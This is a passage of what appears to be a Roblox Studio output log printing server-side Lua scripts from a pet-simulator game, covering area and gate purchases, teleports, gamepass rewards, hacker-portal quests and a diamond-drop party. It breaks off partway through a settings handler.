end)  -  Editar
  04:54:13.773    -  Editar
  04:54:13.773  ----- [2349] ServerScriptService.Scripts.Game.Worlds -----  -  Editar
  04:54:13.773  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------
local RNG = Random.new()

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Buy Area").OnInvoke = function(player, area)
	--if not _L.Shared.ValidateGate(player, area, 100) then
	--	return false, "You're too far away from the gate"
	--end

	local save = _L.Saving.Get(player)
	if (not save) then
		return 
	end

	local currency = _L.Shared.IsHardcore and save.HardcoreCurrency or save

	local dir = _L.Directory.Areas[area]
	if (not dir) then
		return
	end

	local playerGateCurrency = tonumber(currency[dir.gate.currency])
	local gateCost = tonumber(dir.gate.cost)

	if playerGateCurrency < gateCost then
		return false, "You need " .. _L.Functions.Commas(gateCost-playerGateCurrency).. " more " .. dir.gate.currency .. "!"
	end

	currency[dir.gate.currency] = currency[dir.gate.currency] - gateCost
	_L.Achievements.Add(player, "Buy Areas", 1)
	_L.Worlds.GiveArea(player, area)

	return true
end

_L.Network.Invoked("Request Cannon Launch").OnInvoke = function(player, area)
	local hasAccess, declinedMessage = _L.Worlds.HasAccess(player, tostring(area))

	if (not hasAccess) then
		return false, declinedMessage or nil -- ""
	end

	return true, nil
end

_L.Network.Invoked("Buy Teleport Area").OnInvoke = function(plyr, a)
	local save = _L.Saving.Get(plyr)
	if not save then
		return 
	end

	local saveCon = _L.Shared.IsHardcore and save.Hardcore or save
	if _L.Functions.SearchArray(saveCon.TeleportsUnlocked, a) then
		return false, "You already own this!"
	end 

	local dir = _L.Directory.Areas[a]
	if not dir then
		return
	end

	local cst = dir.teleportPrice
	if save.Diamonds >= cst then
		save.Diamonds = save.Diamonds - cst

		table.insert(saveCon.TeleportsUnlocked, a)
		return true
	else
		return false, "You need " .. _L.Functions.Commas(cst - save.Diamonds) .. " more Diamonds!"
	end
end

_L.Network.Invoked("Buy Dominus Gate").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return 
	end

	if not _L.Worlds.HasArea(plyr, "Cave") then
		return false, "no cave area"
	end

	if (_L.Shared.IsHardcore and save.Hardcore or save).OwnsDominusGate then
		return false, "already owned"
	end

	local cost = _L.Shared.IsHardcore and 10_000_000 or 100_000

	if save.Diamonds >= cost then
		(_L.Shared.IsHardcore and save.Hardcore or save).OwnsDominusGate = true
		save.Diamonds = save.Diamonds - cost

		_L.Achievements.Add(plyr, "Secret Room", 1)
		return true
	else
		return false, "You need " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds!"
	end
end

_L.Network.Invoked("Buy Hacker Gate").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return 
	end

	if not _L.Worlds.HasArea(plyr, "Cave") then
		return false, "no cave area"
	end

	if (_L.Shared.IsHardcore and save.Hardcore or save).OwnsDominusGate then
		return false, "already owned"
	end

	local diamondsCost = 100_000
	local curCost = 10_000_000_000

	if save.Diamonds >= diamondsCost and (_L.Shared.IsHardcore and save.Hardcore or save)["Tech Coins"] >= curCost then
		(_L.Shared.IsHardcore and save.Hardcore or save).OwnsHackerGate = true
		(_L.Shared.IsHardcore and save.Hardcore or save)["Tech Coins"] = (_L.Shared.IsHardcore and save.Hardcore or save)["Tech Coins"] - curCost

		save.Diamonds = save.Diamonds - diamondsCost

		_L.Achievements.Add(plyr, "Secret Room 2", 1)
		return true
	else
		return false, "You need " .. _L.Functions.Commas(diamondsCost - save.Diamonds) .. " more Diamonds!"
	end
end

_L.Network.Invoked("Buy Trading Plaza").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return 
	end

	if save.OwnsTradingPlaza then
		return false, "already owned"
	end

	local cost =  1_000_000

	if save.Diamonds >= cost then
		save.OwnsTradingPlaza = true
		save.Diamonds = save.Diamonds - cost

		return true
	else
		return false, "You need " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds!"
	end
end



_L.Network.Invoked('Travel to Trading Plaza').OnInvoke = function(plyr, type)
	local isPlaza = _L.Shared.IsTradingPlaza
	local save = _L.Saving.Get(plyr)
	if not save then
		return nil, "Failed to get players save."
	end

	if not save.OwnsTradingPlaza then
		return false, "Trading plazas isnt unlocked?"
	end

	local localPlaceIds = _L.Shared.LocalPlaceIds
	local teleportingId = isPlaza and type == "VOICE" and localPlaceIds.VoiceTrading or type == "PRO" and localPlaceIds.ProTrading or localPlaceIds.Trading or localPlaceIds.Main or 0

	return pcall(function()
		_L.TeleportService:Teleport(teleportingId, plyr)
	end)
end

_L.Network.Invoked("Toggle Hardcore Mode").OnInvoke = function(plyr)
	local isHardcore = _L.Shared.IsHardcore
	local save = _L.Saving.Get(plyr)
	if not save then
		return nil, "Failed to get players save."
	end

	if not save.HardcoreUnlocked then
		return false, "Hardcore mode isnt unlocked?"
	end

	local localPlaceIds = _L.Shared.LocalPlaceIds
	local teleportingId = isHardcore and localPlaceIds.Main or localPlaceIds.Hardcore or 0

	return pcall(function()
		_L.TeleportService:Teleport(teleportingId, plyr)
	end)
end

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	wait(2)
	
	coroutine.wrap(function()
		if _L.Shared.IsHardcore then
			_G.HasLoaded(plyr) task.delay(1, function()
				_L.Network.Fire("Chat Msg", plyr, "Welcome to Hardcore Mode!", Color3.fromRGB(176,100,254))
			end)
		end	
	end)()
	
	if _L.RunService:IsStudio() then
		return
	end

	local isPlaza = _L.Shared.IsTradingPlaza
	local isHardcore = _L.Shared.IsHardcore

	local save = _L.Saving.Get(plyr)
	if save  then
		if isHardcore and not save.HardcoreUnlocked then
			plyr:Kick("Please rejoin.")
		end
		if isPlaza and not save.OwnsTradingPlaza then
			plyr:Kick("Please rejoin.")
		end
	end
end)

_L.Network.Invoked("Redeem VIP Rewards").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end

	if os.time() - save.VIPCooldown < _L.Settings.VIPRewardsCooldown then
		return false
	end

	if not _L.Gamepasses.Owns(plyr, _L.Directory.Gamepasses.VIP.ID) then
		return false
	end

	local rewards = {}

	for i = 1, 2 do
		local reward = _L.Functions.Lottery(_L.Settings.VIPRewards)

		if reward == "Diamonds" then
			_L.Give.Currency(plyr, 500_000, "Diamonds")
		else
			_L.Boosts.Give(plyr, reward, 1)
		end

		table.insert(rewards, {reward, reward == "Diamonds" and 500_000 or 1})
	end

	_L.Network.Fire("Rewards Redeemed", plyr, rewards)

	save.VIPCooldown = os.time()

	return true
end

_L.Network.Invoked("Offer Shiny Relic").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return nil
	end

	if save.CaveShinyBoost then
		return false, "."
	end

	local cost = 250_000_000

	if save.Diamonds < cost then
		return false, "You cannot afford this! Please get " .. _L.Functions.Commas(cost - save.Diamonds) .. " more Diamonds!"
	end

	save.Diamonds = save.Diamonds - cost
	save.CaveShinyBoost = true

	return true
end

_L.Network.Fired("Start Hacker Portal Quests"):Connect(function(plyr)
	local save = _L.Saving.Get(plyr)
	save = _L.Shared.IsHardcore and save.Hardcore or save
	
	if save then
		if save.HackerPortalProgress[2] == -1 then
			save.HackerPortalProgress = { 0, 1 }
		end
	end
end)

_L.Signal.Fired("Hacker Portal Progress"):Connect(function(plyr, quest, a)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end
	save = _L.Shared.IsHardcore and save.Hardcore or save

	if save.HackerPortalUnlocked then
		return
	end

	local p, q = unpack(save.HackerPortalProgress)
	if q <= 0 or quest ~= q then
		return
	end

	local dir = _L.Shared.HackerPortalQuests[q]
	if not dir then
		return
	end

	if save.HackerPortalProgress[1] <= dir then
		save.HackerPortalProgress[1] = save.HackerPortalProgress[1] + (a or 1)
	end

end)

_L.Network.Invoked("Finish Hacker Portal Quest").OnInvoke = function(plyr)
	local save = _L.Saving.Get(plyr)
	if not save then
		return
	end
	save = _L.Shared.IsHardcore and save.Hardcore or save

	if save.HackerPortalUnlocked or save.HackerPortalProgress[2] <= 0 then
		return
	end

	local dir = _L.Shared.HackerPortalQuests[save.HackerPortalProgress[2]]
	if not dir then
		return
	end

	if save.HackerPortalProgress[1] >= dir then
		save.HackerPortalUnlocked = true
		_L.Network.Fire("Hacker Portal Unlocked", plyr)
	end

	_L.Network.Fire("Hacker Portal Progressed", plyr)

	return true
end

local mineData = {
	["Paradise Cave"] = "Need Impossible Rank",
	["Cyber Cavern"] = "Need 3 Hours Playtime",
	["Mystic Mine"] = "Need Huge Pet"
}
_L.Network.Invoked("Diamond Mine: Get Data").OnInvoke = function(player) -- sdf9ihsdfuih
	return mineData
end

_L.Network.Invoked("Diamond Mine: Release Pet").OnInvoke = function(player, area, uid)
	if not mineData[area] or mineData[area] and mineData[area] ~= "Need Huge Pet" then
		return false
	end

	local save = _L.Saving.Get(player)
	if not save then
		return nil, "no save"
	end

	local pet, owner = _L.Pets.Get(uid)
	if not pet or owner~=player then
		return false
	end

	local dir = _L.Directory.Pets[pet.id]
	if not dir.huge then
		return false, 'not huge'
	end

	local success = pcall(function()
		_L.Pets.Delete(uid)
	end)

	if not success then
		return false, "Failed to delete pet"
	end
	
	mineData[area] = nil
	save["HUGE"] = true
	
	return true	
end

_L.Signal.Fired("World Changed"):Connect(function(player,world)
	local save = _L.Saving.Get(player)
	if save then
		if save.HardcoreUnlocked and world == "Void" then
			_L.Network.Fire("Notification", player, "🔥 Hardcore Mode is unlocked!", {color = Color3.fromRGB(158, 93, 255), force = true})
		end
	end
end)

_L.Signal.Fired("Player Added"):Connect(function(plyr)
	task.spawn(function()
		local save = _L.Saving.Get(plyr)
		if not save then return end
		while plyr and plyr.Parent and task.wait() do
			local noRanks = {
				"Hero",
				"Godlike",
				"Pro",
				"Legend",
				"Elite",
				"Master",
				"Noob",
				"Basic",
				"Immortal",
				"Starter",
				"Champion"
			}

			if not table.find(noRanks, save.Rank) then
				mineData["Paradise Cave"] = nil
			end

			local PlayerPlaytime = _L.Shared.ComputeSaveAge(save)
			if PlayerPlaytime >= 10800 and not mineData["Paradise Cave"] then -- idk
				mineData["Cyber Cavern"] = nil
			end

			if save["HUGE"] then
				mineData["Mystic Mine"] = nil
			end
		end
	end)

	coroutine.wrap(function()
		local lastCheck = os.clock()
		local save = _L.Saving.Get(plyr)
		while _L.Heartbeat(5) do 
			if os.clock() - lastCheck >= 30 then
				if save.World and save.World == "Spawn" then
					local fountain = game.ServerStorage.__WORLDS.Spawn.MAP.Interactive:FindFirstChild("FountainCoinSpawn")
					if fountain then
						local distance = plyr:DistanceFromCharacter(fountain.Position)
						if distance ~= 0 and distance < 130 then
							_L.Orbs.Add(plyr, fountain.Position, "Coins", RNG:NextNumber(10, 20), 35)
						end
					end
				end
			end
		end	
	end)()
end)

   -  Editar
  04:54:13.773    -  Editar
  04:54:13.773  ----- [2350] ServerScriptService.Scripts.Game.Gamepasses -----  -  Editar
  04:54:13.773  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

--local freeGamespasses = require(game.ReplicatedStorage.Library.Client.Settings).FreeGamepasses 

--function CheckOctuple(player)
--	local save = _L.Saving.Get(player)
--	if not save then
--		return
--	end
--	if not _L.Gamepasses.Owns(player, _L.Directory.Gamepasses["Octuple Egg Open"].ID) then
--		return
--	end
--	if _L.Gamepasses.Owns(player, _L.Directory.Gamepasses["Triple Egg Open"].ID) then
--		if not save["octuple"] then
--		save.OwnsOctupleEggs = true
--		save.AutoHatchSettings.TripleEggs = false
--			save.AutoHatchSettings.OctupleEggs = true
--			save["octuple"] = true
--
--		end	
--	end	
--end

--function Check15Pets(player)
--	local save = _L.Saving.Get(player)
--	if not save then
--		return
--	end
--	if not _L.Gamepasses.Owns(player, _L.Directory.Gamepasses["15 Pets Equipped"].ID) then
--		return
--	end
--	if _L.Gamepasses.Owns(player, _L.Directory.Gamepasses["8 Pets Equipped"].ID) then
--		if not save["15 pets"] then
--			save.MaxEquipped = save.MaxEquipped + 7
--			save["15 pets"] = true
--		end	
--	end	
--end

--if freeGamespasses then
--	_L.Signal.Fired("Player Added"):Connect(function(player)
--		local save = _L.Saving.Get(player)
--
--		if save and not save["Claimed Gamepasses"] then
--			save.MaxEquipped = save.MaxEquipped + 4
--			_L.Give.Slots(player, 600)    
--			_L.Worlds.GiveArea(player, "VIP")
--
--			save["Claimed Gamepasses"] = true
--		end
--	end)
--else
_L.Signal.Fired("Robux Spent"):Connect(function(player)
	local save = _L.Saving.Get(player)
end)

local dir = _L.Directory.Gamepasses
_L.Signal.Fired("Gamepass Added"):Connect(function(player, gamepassID)
	local save = _L.Saving.Get(player)
	if save then
		--if gamepassID == dir["Octuple Egg Open"].ID then
		--	CheckOctuple(player)
		--elseif gamepassID == dir["15 Pets Equipped"].ID then
		--	Check15Pets(player)
		--elseif gamepassID == dir["8 Pets Equipped"].ID then
		if gamepassID == dir["8 Pets Equipped"].ID then
			save.MaxEquipped = save.MaxEquipped + 4
		elseif gamepassID == dir["Super Pet Storage"].ID then
			_L.Give.Slots(player, 500)    
		elseif gamepassID == dir["Pet Storage"].ID then
			_L.Give.Slots(player, 100)
		elseif gamepassID == dir.VIP.ID then
			_L.Worlds.GiveArea(player, "VIP")
		end
	end
end)
--end

--_L.Signal.Fired("Player Added"):Connect(function(player)
--	coroutine.wrap(function()
--		while task.wait() do
--			Check15Pets(player)
--			CheckOctuple(player)
--		end
--	end)()
--end)
  -  Editar
  04:54:13.773    -  Editar
  04:54:13.773  ----- [2351] ServerScriptService.Scripts.Game.DiamondParty -----  -  Editar
  04:54:13.774  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
local cost = 50000000000
local RepeatAmount = 100
local delay = 0.45

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Diamond Party: Buy").OnInvoke = function(player)
	local save = _L.Saving.Get(player)
	if not save then
		return nil
	end
	
	if not _L.Shared.IsTradingPlaza then
		return false, "Not plaza!"
	end
	
	if save.Diamonds < cost then
		return false, "You need ".._L.Functions.Commas(cost-save.Diamonds).." more Diamonds!"
	end
	
	save.Diamonds = save.Diamonds - cost
	
	local allPlayers = game.Players:GetPlayers()
	local toGive = cost/#allPlayers
	_L.Network.FireAll("Notification", "💎 " .. player.Name .. " started a 50b Diamond drop party! 💎", {
		color = Color3.fromRGB(78, 244, 252),
		force = true
	})
	
	task.spawn(function()
		for _, player in ipairs(allPlayers) do
			coroutine.wrap(function() 
				for _ = 1, RepeatAmount do
					--task.delay(0.5, function()
						_L.Orbs.Add(player, player.Character.PrimaryPart.CFrame, "Diamonds", toGive/RepeatAmount, 15)
					--end)
					task.wait(delay)
				end
			end)()
		end
	end)
	
	return true
end
  -  Editar
  04:54:13.774    -  Editar
  04:54:13.774  ----- [2352] ServerScriptService.Scripts.Game.Settings -----  -  Editar
  04:54:13.774  --[[
                                                           ,,,,,,╓╓╓╓╓╖
         ,,,,╓╓╓╓╖╥╥╗╗╗╗╗╗╗HH@@@@@@@Ñ╣╣╣╣╢╢╢╣▒▒▒▒▒▒▒▒Ñ╝╜╙╙╙╨╝╢▒▒▒▒▒▒▒▒▒[
         ▒▒▒▒╜╙╙╙╙""""````"╙╨╣▒▒▒▒▒▒[     ║▒▒▒▒▒▒╢╜            ╙╣▒▒▒▒▒▒[
         ▒▒▒▒[                 ║▒▒▒▒[     ║▒▒▒▒▒╜                ╙▒▒▒▒▒╡
         ▒▒▒▒[     ,,,,╓╓       ║▒▒▒╣     ║▒▒▒▒╜     ╓╣▒▒▒▒@,     ╠▒▒▒▒╢
         ▒▒▒▒╢     ]▒▒▒▒▒▒@     ]▒▒▒╢     ]▒▒▒╣     ]▒▒▒▒▒▒▒▒H@╣╢▒▒▒▒▒▒▒
         ╢▒▒▒▒     ]▒▒▒▒▒Ñ`     ╢▒▒▒▒     ]▒▒▒L     ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒                ╓╣▒▒▒▒▒     ]▒▒▒      ▒▒▒▒▒╜╙╙╙╙╙╙"""║▒▒▒▒
         ║▒▒▒▒                 ╙╣▒▒▒▒      ▒▒▒U     ╢▒▒▒▒          ║▒▒▒▒
         ]▒▒▒▒      HH@@@%╗      ╢▒▒▒      ▒▒▒[     ]▒▒▒▒          ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╣     ]▒▒▒      ▒▒▒▒      ║▒▒▒▒▒▒▒╜     ]▒▒▒▒
         ]▒▒▒▒      ▒▒▒▒▒▒▒╜     ]▒▒▒U     ▒▒▒▒╣      `╨ÑÑ╝╜       ]▒▒▒▒U
          ▒▒▒▒U     ``           ╣▒▒▒L     ╢▒▒▒▒╣╖                  ▒▒▒▒[
          ▒▒▒▒[                ╔╣▒▒▒▒[     ║▒▒▒▒▒▒╣╗,        ╓@L ,,,▒▒▒▒[
          ▒▒▒▒[,,,╓╓╓╓╓╓╓╗╗@@╢▒▒▒▒▒▒▒╣@@@@Ñ╣▒▒▒▒▒▒▒▒▒▒▒╢╢║╢ÑÑÑÑ╝╝╝╝╝╝╨╨╜┘
          ╝╝╝╝╝╝╨╨╜╜╙╙╙╙╙╙""""````                    ,,,,,    ,╓╖,
               ,╥@@@╗,    ╥@╣╢╣N,   ╢╣▒▒▒▒╣╗  ║▒▒  ║▒▒▒▒╢╢╢  ╔╣╣╜╙╢▒╣
              ╔▒▒╜╙╙╣▒@  ╢▒╝` ╙▒▒╗  ▒▒[   ▒▒[ ║▒▒  ║▒▒       ╢▒@╖
              ▒▒[       ║▒▒    ]▒▒  ╢▒╢  ╓▒▒[ ]▒▒  ]▒▒╣╣╣╢    "╨╣▒▒╣╗
              ▒▒U       ║▒▒    ]▒▒  ║▒▒▒▒╢Ñ╜  ]▒▒  ]▒▒        ,    ╙▒╢
              ╢▒╣   ╓@╗  ▒▒╗   ╣▒╣  ║▒▒       ]▒▒  ]▒▒╗╗╗m╗m ╙▒╢H╥╗╣▒╝
               ╝▒▒╣╣▒╢╜   ╝▒▒▒▒╢╜   ║▒▒        Ñ╝   ╝╝╝╨╨╜╜╜   `╙╙╙
              
           By: @localonex     
--]]


--------|     Setting     |--------
--[[local AlwaysKeepDef = {
	[1] = "Basic",
	[2] = "Rare",
	[3] = "Epic",
	[4] = "Legendary",
	[5] = "Mythical",
	[6] = "Secret",
	[7] = "Event",
	[8] = "Exclusive"
}]]--

--------|     Library     |--------
local _L = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"))
while (not _L.Loaded) do  game:GetService("RunService").Heartbeat:Wait()  end

--------|    Reference    |--------

--------|    Variables    |--------

--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------

_L.Network.Invoked("Toggle Setting").OnInvoke = function(plyr, setting)
    setting = tostring(setting)

    local shrd = _L.Shared.SettingsInfo[setting]
    if not shrd then
        return
    end

    local save = _L.Saving.Get(plyr)
    if not save then
        return
    end

    local plyrSettings = save.Settings
    if not plyrSettings[setting] then
        return
    end

